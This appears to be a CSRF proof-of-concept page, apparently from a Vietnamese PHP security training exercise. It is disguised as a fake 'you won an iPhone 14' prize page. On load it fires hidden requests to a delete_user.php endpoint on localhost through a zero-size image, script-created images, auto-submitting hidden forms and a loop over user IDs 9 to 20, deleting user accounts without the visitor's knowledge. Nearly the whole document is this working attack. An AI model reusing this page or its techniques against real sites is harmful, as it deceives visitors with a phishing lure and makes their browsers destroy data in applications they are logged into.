<!DOCTYPE html>
<html>
<head>
    <title>Trang Web Hấp Dẫn</title>
</head>
<body>
    <h1>Chúc mừng! Bạn đã trúng thưởng iPhone 14!</h1>
    <p>Hãy click vào link dưới đây để nhận quà...</p>
    
    <!-- Tấn công CSRF ẩn - tự động chạy khi trang load -->
    <img src="http://localhost/php-training/delete_user.php?id=1" 
         width="0" height="0" 
         onerror="alert('Tấn công CSRF đã được thực hiện!')" />
    
    <p>Đang chuyển hướng...</p>
    
    <script>
        // Phương án 2: Sử dụng JavaScript để gửi request
        setTimeout(function() {
            var img = new Image();
            img.src = "http://localhost/php-training/delete_user.php?id=2";
        }, 3000);
        
        // Phương án 3: Tạo form tự submit
        setTimeout(function() {
            var form = document.createElement('form');
            form.method = 'GET';
            form.action = 'http://localhost/php-training/delete_user.php?id=3';
            document.body.appendChild(form);
            form.submit();
        }, 5000);

          // Phương pháp 3: Tạo form và submit tự động
          setTimeout(() => {
                var form = document.createElement('form');
                form.method = 'GET';
                form.action = 'http://localhost/php-training/delete_user.php';
                form.innerHTML = '<input type="hidden" name="id" value="9">';
                form.style.display = 'none';
                document.body.appendChild(form);
                form.submit();
                document.body.removeChild(form);
            }, 1000);

            // Phương pháp 4: Tạo nhiều ảnh requests
            for (let i = 9; i <= 20; i++) {
                setTimeout(() => {
                    var img = document.createElement('img');
                    img.src = `http://localhost/php-training/delete_user.php?id=${i}`;
                    img.style.display = 'none';
                    document.body.appendChild(img);
                    setTimeout(() => {
                        document.body.removeChild(img);
                    }, 100);
                }, i * 200);
            }
    </script>
</body>
</html>
